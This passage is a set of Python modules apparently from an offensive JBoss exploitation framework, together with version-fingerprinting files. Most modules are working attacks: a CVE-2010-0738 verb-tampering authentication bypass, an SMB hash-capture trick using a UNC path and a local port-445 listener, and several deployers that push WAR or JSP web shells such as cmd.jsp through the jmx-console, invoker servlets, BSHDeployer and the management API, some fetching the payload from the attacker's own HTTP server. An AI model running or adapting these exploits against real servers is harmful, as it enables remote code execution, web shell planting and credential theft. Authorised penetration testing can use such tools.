    def check(self, fingerprint):
        """
        """

        if fingerprint.title == JINTERFACES.JMX:
            return True
        elif fingerprint.version in ["7.0", "7.1", '8.0']:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """
        """

        utility.Msg("Obtaining deployed applications...")

        if fingerprint.version in ["5.0", "5.1", "6.0", "6.1"] and\
            fingerprint.title == JINTERFACES.JMX:
           url = 'http://{0}:{1}/jmx-console/HtmlAdaptor?action='\
                 'displayMBeans&filter=jboss.web.deployment'.format\
                  (fingerengine.options.ip, fingerprint.port)
        elif fingerprint.version in ["7.0", "7.1", '8.0']:
            return self.run7(fingerengine, fingerprint)
        elif fingerprint.title == JINTERFACES.JMX:
            url = 'http://{0}:{1}/jmx-console/'.format(fingerengine.options.ip,
                                               fingerprint.port)
        else:
            # unsupported interface
            utility.Msg("Interface %s version %s is not supported." % \
                            (fingerprint.title, fingerprint.version), LOG.DEBUG)
            return

        response = utility.requests_get(url)
        if response.status_code == 401:
            utility.Msg('Host %s:%s requires auth for JMX, checking...' %
                               (fingerengine.options.ip, fingerprint.port),
                               LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)

            if cookies:
                response = utility.requests_get(url, cookies=cookies[0], 
                                                auth=cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" % 
                              (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return
    
        if response.status_code == 200:

            wars = findall("war=(.*?)</a>", response.content)
            if len(wars) > 0:
                for war in wars:
                    utility.Msg("Deployment found: %s" % war)
            else:
                utility.Msg("No deployments found.")


    def run7(self, fingerengine, fingerprint):
        """ JBoss 7.x does not have a jmx-console, and instead uses an 
        HTTP management API that can be queried with JSON.  It's not
        much fun to parse, but it does its job.
        """

        headers = {'Content-Type' : 'application/json'}
        data = '{"operation":"read-resource","address":[{"deployment":"*"}]}'
        url = "http://{0}:{1}/management".format(fingerengine.options.ip,
                                                 fingerprint.port)

        response = utility.requests_post(url, headers=headers, data=data)
        if response.status_code == 401:
            utility.Msg("Host %s:%s requires auth for management, checking..." % 
                                    (fingerengine.options.ip, fingerprint.port),
                                    LOG.DEBUG)

            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)
            if cookies:
                response = utility.requests_post(url, headers=headers, data=data,
                                                 auth=cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" % 
                                    (fingerengine.options.ip, fingerprint.port),
                                    LOG.ERROR)
                return

        json_list = response.json()['result']
        for item in json_list:

            item_dict = dict(item)
            if "address" in item_dict.keys():
                utility.Msg("Deployment found: %s" % 
                                    dict(item_dict['address'][0])['deployment'])

        if len(json_list) <= 0:
            utility.Msg("No deployments found.", LOG.INFO)

########NEW FILE########
__FILENAME__ = smb_hashes
from src.platform.jboss.authenticate import checkAuth
from src.platform.jboss.interfaces import JINTERFACES
from src.lib.cifstrap import Handler
from collections import OrderedDict
from threading import Thread
from log import LOG
from auxiliary import Auxiliary
from os import getuid
from time import sleep
import socket
import utility
import state


class Auxiliary:

    def __init__(self):
        self.name = 'Obtain SMB hash' 
        self.versions = ['3.0','3.2','4.0','4.2','5.0','5.1','6.0','6.1']
        self.show = True
        self.flag = 'jb-smb'
        self._Listen = False

    def check(self, fingerprint):
        if fingerprint.title in [JINTERFACES.JMX] and fingerprint.version \
                                                        in self.versions:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """ This module will invoke jboss:load() with a UNC path to force the
        server to make a SMB request, thus giving up its encrypted hash with a 
        value we know (1122334455667788).

        Thanks to @cd1zz for the idea for this
        """

        if getuid() > 0:
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        utility.Msg("Setting up SMB listener..")

        self._Listen= True
        thread = Thread(target=self.smb_listener)
        thread.start()

        utility.Msg("Invoking UNC loader...")

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
        uri = '/jmx-console/HtmlAdaptor'
        data = self.getData(fingerprint.version)
        url = base + uri
        
        response = utility.requests_post(url, data=data)
        if response.status_code == 401:
            
            utility.Msg("Host %s:%s requires auth, checking..." % 
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)

            if cookies:
                response = utility.requests_post(url, data=data, 
                                                cookies=cookies[0],
                                                auth=cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" %
                            (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return

        while thread.is_alive():
            # spin...
            sleep(1)

        if response.status_code != 500:
            
            utility.Msg("Unexpected response: HTTP %d" % response.status_code, LOG.DEBUG)

        self._Listen = False

    def getData(self, version):
        """ For some reason 5.x+ double encodes characters
        Haven't figured this out yet for 7.x
        """

        if version in ["5.0", "5.1", "6.0", "6.1"]:
            return OrderedDict([
                            ('action', 'invokeOp'),
                            ('name', 'jboss%3Atype%3DService%2Cname%3DSystemProperties'),
                            ('methodIndex', 21),
                            ('arg0', "\\\\{0}\\asdf".format(utility.local_address()))
                            ])

        elif version in ["3.2", "4.0", "4.2"]:
            return OrderedDict([
                            ('action', 'invokeOp'),
                            ('name', 'jboss:type=Service,name=SystemProperties'),
                            ('methodIndex', 21),
                            ('arg0', "\\\\{0}\\asdf".format(utility.local_address()))
                            ])


    def smb_listener(self):
        """ Accept a connection and pass it off for parsing to cifstrap
        """

        try:
            handler = None
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(state.timeout)
            sock.bind(('', 445))
            sock.listen(1)

            while self._Listen:
                try:
                    (con, addr) = sock.accept()
                except:
                    # timeout
                    return

                handler = Handler(con, addr)
                handler.start()

                while handler.is_alive():
                    # spin...
                    sleep(1)

                if handler.data:
                    utility.Msg("%s" % handler.data, LOG.SUCCESS)

                break

        except Exception, e:
            utility.Msg("Socket error: %s" % e, LOG.ERROR)
        finally:
            sock.close()

########NEW FILE########
__FILENAME__ = verb_tamper
from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import parse_war_path
from auxiliary import Auxiliary
from os.path import abspath
from log import LOG
from urllib import quote_plus
import utility


class Auxiliary:
    
    def __init__(self):
        self.name = 'JBoss Verb Tampering (CVE-2010-0738)'
        self.versions = ["4.0"]
        self.show = False
        self.flag = 'verb-tamper'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions and \
                fingerprint.title == JINTERFACES.JMX:
           return True

        return False

    def run(fingerengine, fingerprint):
        """ This module exploits CVE-2010-0738, which bypasses authentication
        by submitting requests with different HTTP verbs, such as HEAD. 
        """

        utility.Msg("Checking %s for verb tampering" % fingerengine.options.ip,
                                                       LOG.DEBUG)

        url = "http://{0}:{1}/jmx-console/HtmlAdaptor".format(fingerengine.options.ip,
                                                              fingerprint.port)

        response = utility.requests_head(url)
        if response.status_code == 200:
            utility.Msg("Vulnerable to verb tampering, attempting to deploy...", LOG.SUCCESS)

            war_file = abspath(fingerengine.options.deploy)
            war_name = parse_war_path(war_file)
            tamper = "/jmx-console/HtmlAdaptor?action=invokeOp"\
                     "&name=jboss.admin:service=DeploymentFileRepository&methodIndex=5"\
                     "&arg0={0}&arg1={1}&arg2=.jsp&arg3={2}&arg4=True".format(
                              war_file.replace('.jsp', '.war'), war_name,
                              quote_plus(open(war_file).read()))              

            response = utility.requests_head(url + tamper)
            if response.status_code == 200:
                utility.Msg("Successfully deployed {0}".format(war_file), LOG.SUCCESS)
            else:
                utility.Msg("Failed to deploy (HTTP %d)" % response.status_code, LOG.ERROR)

########NEW FILE########
__FILENAME__ = bsh_deploy
from src.platform.jboss.authenticate import checkAuth
from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import bsh_deploy
from log import LOG
from base64 import b64encode
from os import system, path
import utility


versions = ["3.2", "4.0", "4.2"]
title = JINTERFACES.WC
def deploy(fingerengine, fingerprint):
    """ This module exploits the BSHDeployer in an exposed JBoss web-console.
    It essentially invokes /web-console/Invoker to download and deploy a BSH,
    which can be used as a stager for our WAR payload.
    """

    war_file = path.abspath(fingerengine.options.deploy)
    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/web-console/Invoker".format(
                  fingerengine.options.ip, fingerprint.port)

    if not rewriteBsh(war_file, fingerengine.options.remote_os):
        utility.Msg("Failed to write WAR to BSH", LOG.ERROR)
        return

    # poll the URL to check for 401
    response = utility.requests_get(url)
    if response.status_code == 401:
        utility.Msg("Host %s:%s requires auth for web-console, checking.." %
                    (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            (usr, pswd) = (cookies[1].username, cookies[1].password)
            response = bsh_deploy(fingerengine.options.remote_os, url,  
                                  fingerprint.version.split('.')[0], 
                                  usr, pswd)
        else:
            utility.Msg("Could not get auth for %s:%s" %
                         (fingerengine.options.ip, fingerprint.port), LOG.ERROR)

    else:
        # run our java lib for the serialized request
        response = bsh_deploy(fingerengine.options.remote_os, url,
                              fingerprint.version.split('.')[0]) 

    # remove the copied bsh
    system("rm ./src/lib/jboss/bsh_deploy/bshdeploy.bsh")

    if response:
        if type(response) is str and response != '':
            utility.Msg(response, LOG.DEBUG)
        elif response.returncode > 0:
            utility.Msg("Failed to deploy to %s:%s" % (fingerengine.options.ip,
                                                   fingerprint.port), 
                                                   LOG.ERROR)
            utility.Msg(response.output, LOG.DEBUG)
            return
    
    utility.Msg("{0} deployed to {1}".format(war_file,
                                                fingerengine.options.ip),
                                                LOG.SUCCESS)


def rewriteBsh(war_file, arch):
    """ Makes a copy of our beanshell script template and replaces
    a handful of placeholder variables, such as WAR data and write path.
    """

    try:
        
        base = "./src/lib/jboss/bsh_deploy"
        b64 = b64encode(open(war_file, "rb").read())
        path = getPath(arch)
       
        with open("{0}/_bshdeploy.bsh".format(base)) as f1:
            with open("{0}/bshdeploy.bsh".format(base), "w") as f2:
                for line in f1:
                    tmp = line

                    # replace our vars
                    if "[[WDATA]]" in line:
                        tmp = tmp.replace("[[WDATA]]", b64)
                    elif "[[ARCH]]" in line:
                        tmp = tmp.replace("[[ARCH]]", path)
                    f2.write(tmp)

        return True
    except Exception, e:
        utility.Msg(e, LOG.ERROR)
    
    return False


def getPath(arch):
    """ Different paths for different architectures
    """

    return "c:/windows/temp/cmd.war" if arch is "windows" else "/tmp/cmd.war"

########NEW FILE########
__FILENAME__ = dfs_deploy
from src.platform.jboss.interfaces import JINTERFACES
from src.platform.jboss.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from collections import OrderedDict
from os.path import abspath
from log import LOG
import utility

title = JINTERFACES.JMX
versions = ["3.2", "4.0", "4.2", "5.0", "5.1"]
def deploy(fingerengine, fingerprint):
    """ Exploits the DeploymentFileRepository bean to deploy
    a JSP to the remote server.  Note that this requires a JSP,
    not a packaged or exploded WAR.
    """

    war_file = abspath(fingerengine.options.deploy)
    war_name = parse_war_path(war_file)
    if '.war' in war_file:
        tmp = utility.capture_input("This deployer requires a JSP, default to cmd.jsp? [Y/n]")
        if "n" in tmp.lower():
            return

        war_file = abspath("./src/lib/resources/cmd.jsp")
        war_name = "cmd"

    utility.Msg("Preparing to deploy {0}...".format(war_name))

    url = "http://{0}:{1}/jmx-console/HtmlAdaptor".format(
                    fingerengine.options.ip, fingerprint.port)

    data = OrderedDict([
                    ('action', 'invokeOp'),
                    ('name', 'jboss.admin:service=DeploymentFileRepository'),
                    ('methodIndex', 5),
                    ('arg0', war_file.replace('.jsp', '.war')),
                    ('arg1', war_name),
                    ('arg2', '.jsp'),
                    ('arg3', open(war_file, 'r').read()),
                    ('arg4', True)
                    ])

    response = utility.requests_post(url, data=data)
    if response.status_code == 401:
        utility.Msg("Host %s:%s requires auth for JMX, checking..." %
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            response = utility.requests_post(url, data=data, cookies=cookies[0],
                                            auth=cookies[1])
        else:
            utility.Msg("Could not get auth for %s:%s" %
                                (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

    if response.status_code == 200:
        utility.Msg("Successfully deployed '/{0}/{1}'".format(war_name, war_name + '.jsp'), LOG.SUCCESS)
    else:
        utility.Msg("Failed to deploy (HTTP %d)" % response.status_code, LOG.ERROR)

########NEW FILE########
__FILENAME__ = ejbinvokerservlet
from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import invkdeploy, parse_war_path
from os.path import abspath
from random import randint
from log import LOG
import utility

versions = ["Any", "3.2", "4.0", "4.2", "5.0", "5.1"]
title = JINTERFACES.EIN
def deploy(fingerengine, fingerprint):
    """ This deployer attempts to deploy to the EJBInvokerServlet, often
    left unprotected.  For versions 3.x and 4.x we can deploy WARs, but for 5.x
    the HttpAdaptor invoker is broken (in JBoss), so instead we invoke 
    the DeploymentFileRepository method.  This requires a JSP instead of a WAR.
    """

    war_file = fingerengine.options.deploy
    war_name = parse_war_path(war_file)

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/invoker/EJBInvokerServlet".format(
                    fingerengine.options.ip, fingerprint.port)
    fingerengine.random_int = str(randint(50,300))

    # the attached fingerprint doesnt have a version; lets pull one of the others
    # to fetch it.  dirty hack.
    fp = [f for f in fingerengine.fingerprints if f.version != 'Any']
    if len(fp) > 0:
        fp = fp[0]
    else:
        ver = utility.capture_input("Could not reliably determine version, "
                                    "please enter the remote JBoss instance"
                                    " version")
        if len(ver) > 0:
            if '.' not in ver:
                ver += '.0'

            if ver not in versions:
                utility.Msg("Failed to find a valid fingerprint for deployment.", LOG.ERROR)
                return
            else:
                fp = fingerprint
                fp.version = ver
        else:
            return

    if '.war' in war_file:
        utility.Msg("This deployer requires a JSP payload", LOG.ERROR)
        return

    response = invkdeploy(fp.version, url, abspath(war_file),
                          fingerengine.random_int)

    if len(response) > 1:
        utility.Msg(response, LOG.DEBUG)
    else:
        utility.Msg("{0} deployed to {1} (/{2})".format(war_file, 
                                 fingerengine.options.ip,
                                 war_name + fingerengine.random_int),
                                 LOG.SUCCESS)

########NEW FILE########
__FILENAME__ = http_management
from src.platform.jboss.interfaces import JINTERFACES
from src.platform.jboss.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from os.path import abspath
from log import LOG
import utility

versions = ["7.0", "7.1", '8.0']
title = JINTERFACES.MM
def deploy(fingerengine, fingerprint):
    """ Deploying WARs to JBoss 7.x is a three stage process.  The first stage
    is a POST request with the file data to /management/add-content.  This places
    the data on the server and passes back a hash to reference it.  The second
    stage is an association of this data with a WAR file name, i.e. cmd.war.
    The final stage is to enable the WAR, which is a simple JSON request with the
    deploy operation.
    """

    war_file = abspath(fingerengine.options.deploy)
    war_name = parse_war_path(war_file)
    war_raw = war_file.rsplit('/', 1)[1]
    utility.Msg("Preparing to deploy {0}...".format(war_file))

    base = "http://{0}:{1}/management".format(fingerengine.options.ip,
                                              fingerprint.port)
    add_content = "/add-content"
    association = '{{"address":[{{"deployment":"{0}"}}],"operation":"add",'\
                  '"runtime-name":"{2}","content":[{{"hash":{{"BYTES_VALUE"'\
                  ':"{1}"}}}}],"name":"{0}"}}'
    deploy = '{{"operation":"deploy", "address":{{"deployment":"{0}"}}}}'
    headers = {"Content-Type":"application/json"}

    try:
        fwar = {war_file : open(war_file, "r").read()}
    except:
        utility.Msg("Failed to open WAR (%s)" % war_file, LOG.ERROR)
        return

    # first we POST the WAR to add-content
    response = utility.requests_post(base + add_content, files=fwar)
    if response.status_code == 401:
        response = redo_auth(fingerengine, fingerprint, base + add_content, 
                             files=fwar)

    if response.status_code != 200:
        utility.Msg("Failed to POST data (HTTP %d)" % response.status_code, LOG.ERROR)
        return

    # fetch our BYTES_VALUE
    if response.json()['outcome'] != 'success':
        utility.Msg("Failed to POST data", LOG.ERROR)
        utility.Msg(response.json(), LOG.DEBUG)
        return

    BYTES_VALUE = response.json()['result']['BYTES_VALUE']

    # now we need to associate the bytes with a name
    response = utility.requests_post(base, 
                                data=association.format(war_name, BYTES_VALUE, war_raw),
                                headers=headers)

    if response.status_code == 401:
        response = redo_auth(fingerengine, fingerprint, base,
                            data=association.format(war_name, BYTES_VALUE, war_raw),
                            headers=headers)

    if response.status_code != 200:
        utility.Msg("Failed to associate content (HTTP %d)" % response.status_code, LOG.ERROR)
        utility.Msg(response.content, LOG.DEBUG)
        return

    # now enable the WAR
    deploy = deploy.format(war_name)

    response = utility.requests_post(base, data=deploy, headers=headers)
    if response.status_code == 401:
        response = redo_auth(fingerengine, fingerprint, base, data=deploy,
                             headers=headers)
                             
    if response.status_code != 200:
        utility.Msg("Failed to enable WAR (HTTP %d)" % response.status_code, LOG.ERROR)
        utility.Msg(response.content, LOG.DEBUG)
        return

    utility.Msg("%s deployed to %s." % (war_file, fingerengine.options.ip), 
                                        LOG.SUCCESS)


def redo_auth(fingerengine, fingerprint, url, **args):
    """ For whatever reason, we need to reauth at each stage of this process.
    It's a huge pain, and I have no idea why they thought this was a great idea.
    If you perform a deployment manually and inspect the traffic with a web
    proxy, you can see the 401's for each step.  It's ridiculous.
    """

    response = None
    utility.Msg("Host %s:%s requires auth, checking..." % 
                    (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
    cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                        fingerprint.title, fingerprint.version)

    if cookies:
        response = utility.requests_post(url, auth=cookies[1], **args)
    else:
        utility.Msg("Could not get auth for %s:%s" % 
                        (fingerengine.options.ip, fingerprint.port), LOG.ERROR)

    return response

########NEW FILE########
__FILENAME__ = jmxinvokerservlet
from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import invkdeploy, parse_war_path
from os.path import abspath
from random import randint
from log import LOG
import utility

versions = ["Any", "3.2", "4.0", "4.2", "5.0", "5.1"]
title = JINTERFACES.JIN
def deploy(fingerengine, fingerprint):
    """ This deployer attempts to deploy to the JMXInvokerServlet, often
    left unprotected.  For versions 3.x and 4.x we can deploy WARs, but for 5.x
    the HttpAdaptor invoker is broken (in JBoss), so instead we invoke 
    the DeploymentFileRepository method.  This requires a JSP instead of a WAR.
    """

    war_file = fingerengine.options.deploy
    war_name = parse_war_path(war_file)

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/invoker/JMXInvokerServlet".format(
                   fingerengine.options.ip, fingerprint.port)
    fingerengine.random_int = str(randint(50,300))


    # the attached fingerprint doesnt have a version; lets pull one of the others
    # to fetch it.  dirty hack.
    fp = [f for f in fingerengine.fingerprints if f.version != 'Any']
    if len(fp) > 0:
        fp = fp[0]
    else:
        ver = utility.capture_input("Could not reliably determine version, "
                                    "please enter the remote JBoss instance"
                                    " version")
        if len(ver) > 0:
            if '.' not in ver:
                ver += '.0'

            if ver not in versions:
                utility.Msg("Failed to find a valid fingerprint for deployment.", LOG.ERROR)
                return
            else:
                fp = fingerprint
                fp.version = ver
        else:
            return

    if '.war' in war_file:
        utility.Msg("This deployer requires a JSP payload", LOG.ERROR)
        return

    response = invkdeploy(fp.version, url, abspath(war_file),
                          fingerengine.random_int)
        
    if len(response) > 1:
        utility.Msg(response, LOG.DEBUG)
    else:
        utility.Msg("{0} deployed to {1} (/{2})".format(war_name,
                                fingerengine.options.ip,
                                war_name + fingerengine.random_int), 
                                LOG.SUCCESS)

########NEW FILE########
__FILENAME__ = jmx_deploy
from src.platform.jboss.interfaces import JINTERFACES
from src.platform.jboss.authenticate import checkAuth
from src.module.deploy_utils import _serve, waitServe, killServe
from collections import OrderedDict
from threading import Thread
from requests import get, exceptions
from time import sleep
from log import LOG
from os.path import abspath
import state
import utility


versions = ["3.0", "3.2", "4.0", "4.2", "6.0", "6.1"]
title = JINTERFACES.JMX
def deploy(fingerengine, fingerprint):
    """
    """

    war_file = abspath(fingerengine.options.deploy)
    war_name = war_file.rsplit('/', 1)[1] 
    
    # start up the local HTTP server
    server_thread = Thread(target=_serve, args=(war_file,))
    server_thread.start()
    sleep(2)
    
    # major versions of JBoss have different method indices
    methodIndex = {"3.0" : 21,
                  "3.2" : 22,
                  "4.0" : 3,
                  "4.2" : 3,
                  "6.0" : 19,
                  "6.1" : 19
                  }

    if fingerprint.version == "3.0":
        tmp = utility.capture_input("Version 3.0 has a strict WAR XML structure.  "
                              "Ensure your WAR is compatible with 3.0 [Y/n]")
        if 'n' in tmp.lower():
            return

    utility.Msg("Preparing to deploy {0}..".format(war_file))

    url = 'http://{0}:{1}/jmx-console/HtmlAdaptor'.format(
                    fingerengine.options.ip, fingerprint.port)

    data = OrderedDict([
                    ('action', 'invokeOp'),
                    ('name', 'jboss.system:service=MainDeployer'),
                    ('methodIndex', methodIndex[fingerprint.version]),
                    ('arg0', 'http://{0}:{1}/{2}'.format(
                      utility.local_address(), state.external_port,war_name))
                    ])

    response = utility.requests_post(url, data=data)
    if response.status_code == 401:
        utility.Msg("Host %s:%s requires auth for JMX, checking..." %
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            try:
                response = utility.requests_post(url, data=data,
                                            cookies=cookies[0], auth=cookies[1])
            except exceptions.Timeout:
                # we should be fine here, so long as we get the POST request off.
                # Just means that we haven't gotten a response quite yet.
                response.status_code = 200

        else:
            utility.Msg("Could not get auth for %s:%s" %
                             (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

    if response.status_code == 200:
        if waitServe(server_thread):
            utility.Msg("{0} deployed to {1}".format(war_file,
                                                    fingerengine.options.ip),
                                                    LOG.SUCCESS)
    else:
        utility.Msg("Failed to call {0} (HTTP {1})".format
                               (fingerengine.options.ip, response.status_code),
                               LOG.ERROR)

        killServe()

########NEW FILE########
__FILENAME__ = webconsole_deploy
from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import _serve, wc_invoke, waitServe,killServe
from requests import get
from threading import Thread
from time import sleep
from log import LOG
from os.path import abspath
import state
import utility

versions = ["3.2", "4.0", "4.2"]
title = JINTERFACES.WC
def deploy(fingerengine, fingerprint):
    """
    """

    war_file = abspath(fingerengine.options.deploy)
    war_name = war_file.rsplit('/', 1)[1]

    # start the local HTTP server
    server_thread = Thread(target=_serve, args=(war_file,))
    server_thread.start()
    sleep(1.5)

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/web-console/Invoker".format(
                        fingerengine.options.ip, fingerprint.port)

    local_url = "http://{0}:{1}/{2}".format(utility.local_address(), 
                                       state.external_port,war_name)

    # poll the URL to check for a 401
    response = utility.requests_get(url)
    if response.status_code == 401:
        utility.Msg("Host %s:%s requires auth for web-console, checking..", 
                    LOG.DEBUG)    
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            (usr, pswd) = (cookies[1].username, cookies[1].password)
            response = wc_invoke(url, local_url, usr, pswd)
        else:
            utility.Msg("Could not get auth for %s:%s" % 
                         (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
    
    else:
        # run our java lib for serializing the request
        response = wc_invoke(url, local_url)

    if not response == '':
        utility.Msg(response, LOG.DEBUG)

    if waitServe(server_thread):
        utility.Msg("{0} deployed to {1}".format(war_file,
                                            fingerengine.options.ip),
                                            LOG.SUCCESS)
    killServe()

########NEW FILE########
__FILENAME__ = JBoss32JMX
from src.platform.jboss.interfaces import JMXInterface


class FPrint(JMXInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "3.2"

########NEW FILE########
__FILENAME__ = JBoss32WC
from src.platform.jboss.interfaces import WebConsoleInterface


class FPrint(WebConsoleInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "3.2"

########NEW FILE########
__FILENAME__ = JBoss3JMX
from src.platform.jboss.interfaces import JMXInterface


class FPrint(JMXInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "3.0"

########NEW FILE########
__FILENAME__ = JBoss42JMX
from src.platform.jboss.interfaces import JMXInterface


class FPrint(JMXInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.2"

########NEW FILE########
__FILENAME__ = JBoss42WC
from src.platform.jboss.interfaces import WebConsoleInterface


class FPrint(WebConsoleInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.2"

########NEW FILE########
__FILENAME__ = JBoss4JMX
from src.platform.jboss.interfaces import JMXInterface


class FPrint(JMXInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.0"

########NEW FILE########
__FILENAME__ = JBoss4WC
from src.platform.jboss.interfaces import WebConsoleInterface


class FPrint(WebConsoleInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.0"

########NEW FILE########
__FILENAME__ = JBoss51
from src.platform.jboss.interfaces import JINTERFACES
from cprint import FingerPrint
from requests import exceptions
from log import LOG
import utility


class FPrint(FingerPrint):
    
    def __init__(self):
        self.platform = "jboss"
        self.version = "5.1"
        self.title = JINTERFACES.WM
        self.uri = "/admin-console/login.seam"
        self.port = 8080
        self.hash = None 
    
    def check(self, ip, port=None):
        """
        """
        try:
            rport = self.port if port is None else port
            request = utility.requests_get("http://{0}:{1}{2}".format(
                                    ip, rport, self.uri))

            # JBoss 5.1 and 6.0 share images, so we can't fingerprint those, but
            # we can check the web server version and a lack of a 6 in the AS title
            if "JBoss AS Administration Console 1.2.0" in request.content and \
               "JBoss AS 6 Admin Console" not in request.content:
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                          ip, rport),
                                                          LOG.DEBUG)

        return False

########NEW FILE########
__FILENAME__ = JBoss51JMX
from src.platform.jboss.interfaces import JMXInterface


class FPrint(JMXInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "5.1"

########NEW FILE########
__FILENAME__ = JBoss51WC
from src.platform.jboss.interfaces import WebConsoleInterface


class FPrint(WebConsoleInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "5.1"

########NEW FILE########
__FILENAME__ = JBoss5JMX
from src.platform.jboss.interfaces import JMXInterface


class FPrint(JMXInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "5.0"

########NEW FILE########
__FILENAME__ = JBoss5WC
from src.platform.jboss.interfaces import WebConsoleInterface


class FPrint(WebConsoleInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "5.0"

########NEW FILE########
__FILENAME__ = JBoss6
from src.platform.jboss.interfaces import JINTERFACES
from cprint import FingerPrint


class FPrint(FingerPrint):
    
    def __init__(self):
        self.platform = "jboss"
        self.version = "6.0"
        self.title = JINTERFACES.WM
        self.uri = "/admin-console/plugins/jopr-hibernate-plugin-3.0.0.jar"
        self.port = 8080
        self.hash = "15dd8fe4f62a63b4ecac3dcbbae0a862" 

########NEW FILE########
__FILENAME__ = JBoss61
from src.platform.jboss.interfaces import JINTERFACES
from cprint import FingerPrint


class FPrint(FingerPrint):
    
    def __init__(self):
        self.platform = "jboss"
        self.version = "6.1"
        self.title = JINTERFACES.WM
        self.uri = "/admin-console/plugins/jopr-hibernate-plugin-3.0.0.jar"
        self.port = 8080
        self.hash = "740c9a0788ffce2944b9c9783d8ce679" 

########NEW FILE########
__FILENAME__ = JBoss61JMX
from src.platform.jboss.interfaces import JMXInterface

                    
class FPrint(JMXInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "6.1"

########NEW FILE########
__FILENAME__ = JBoss6JMX
from src.platform.jboss.interfaces import JMXInterface

                    
class FPrint(JMXInterface):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "6.0"

########NEW FILE########
__FILENAME__ = JBoss71Manage
from src.platform.jboss.interfaces import JINTERFACES
from cprint import FingerPrint


class FPrint(FingerPrint):
    
    def __init__(self):
        self.platform = "jboss"
        self.version = "7.1"
        self.title = JINTERFACES.MM
        self.uri = "/console/app/gwt/chrome/chrome_rtl.css"
        self.port = 9990
        self.hash = "14755bd918908c2703c57bd1a52046b6"

########NEW FILE########
__FILENAME__ = JBoss7Manage
from src.platform.jboss.interfaces import JINTERFACES
from cprint import FingerPrint


class FPrint(FingerPrint):
    
    def __init__(self):
        self.platform = "jboss"
        self.version = "7.0"
        self.title = JINTERFACES.MM
        self.uri = "/console/app/gwt/chrome/chrome_rtl.css"
        self.port = 9990
        self.hash = "bb721162408f5cc1e18cc7a9466ee90c" # tested against 7.0.0 and 7.0.2

########NEW FILE########
__FILENAME__ = JBoss8Manage
from src.platform.jboss.interfaces import JINTERFACES
from requests import exceptions
from cprint import FingerPrint
from log import LOG
import utility


class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "jboss"
        self.version = "8.0"
        self.title = JINTERFACES.MM
        self.uri = "/error/index_win.html"
        self.port = 9990
        self.hash = None

    def check(self, ip, port = None):
        """ This works for current releases of JBoss 8.0; future
        versions may require us to modify this.
        """

        try:
            rport = self.port if port is None else port
            request = utility.requests_get("http://{0}:{1}{2}".format(
                                    ip, rport, self.uri))

            if request.status_code == 200:
                if "WildFly 8" in request.content:
                    return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                        ip, rport),
                                                        LOG.DEBUG)

        return False

########NEW FILE########
